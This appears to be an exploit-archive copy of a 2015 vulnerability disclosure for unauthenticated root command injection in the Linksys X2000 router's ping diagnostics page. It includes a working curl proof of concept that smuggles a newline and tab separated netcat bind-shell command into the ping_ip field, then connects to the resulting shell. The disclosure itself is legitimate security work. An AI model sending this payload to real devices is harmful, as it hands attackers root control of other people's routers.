@@ -1,0 +1,64 @@
+id: 24502
+date: 11/04/2015
+title: Linksys X2000 Command Execution Vulnerability
+author: Lorenzo Pistone
+cves: 
+
+Hello,
+I have found on my router, a Linksys X2000, that there is a poor 
+validation of the IP target in the ping diagnostics web page 
+(http://$router_ip/Diagnostics.asp). This can be used to execute 
+arbitrary commands as the root user on the device. It appears that there 
+is no need for authentication to exploit the flaw, so this is 
+exploitable from WAN if the administrator has activated remote 
+management from the web UI.
+
+The web interface is managed by process /bin/httpd. The diagnostic web 
+pages accepts an user-supplied IP to run a ping test on it. This user 
+value is truncated at the first occurrence of the characters " ;<>" in 
+an attempt to make the user-provided string safe when appended to 
+"/bin/ping " and passed to system(). However, this is not sufficient at 
+all to prevent the injection of shell commands. In fact, spaces for 
+arguments separation can be replaced by tabs and semicolons with new 
+lines. This allows arbitrary remote command execution with root privileges.
+
+To exacerbate the issue, it appears that there is no need for any 
+authentication to trigger the ping diagnostic. I have tested this on LAN 
+and it works. Regarding remote access, I failed to get remote access to 
+work at all, because for some reason when I enable it a rule to the nat 
+table is inserted to drop packets directed to the web interface, before 
+the rule that honors the "Remote Management Port" field in the web 
+configuration. I do not know why this happens and if it is intended 
+behavior. However, by using the root shell from LAN to remove this 
+iptables entry, I could successfully exploit the flaw from WAN too.
+
+This is the POC:
+
+    #activate the shellby requesting a ping test to a special ip string
+    ("busybox nc -e /bin/sh -l -p 1234")
+    curl -s \
+       --data submit_button=Diagnostics \
+       --data change_action=gozila_cgi \
+       --data submit_type=start_ping \
+       --data action= \
+       --data commit=0 \
+       --data nowait=1 \
+       --data ping_size=32 \
+       --data ping_times=5 \
+       --data-urlencode
+    ping_ip=$'\nbusybox\tnc\t-e\t/bin/sh\t-l\t-p\t1234'
+    $router_ip/apply.cgi >/dev/null &
+    #access the shell
+    nc $router_ip 1234
+    #now can execute any non-interactive shell command
+
+I suspect that there are similar issues with the traceroute diagnostic, 
+and in adding port forwarding entries. A more blog-y description of the 
+issue, including the assembly locations that fail to properly sanitize 
+the user value, can be found here 
+http://meat.pisto.horse/2015/11/rooting-linksys-x2000-router-system.html
+
+Cheers.
+Lorenzo Pistone
+
+#  0day.today [2023-03-22]  #
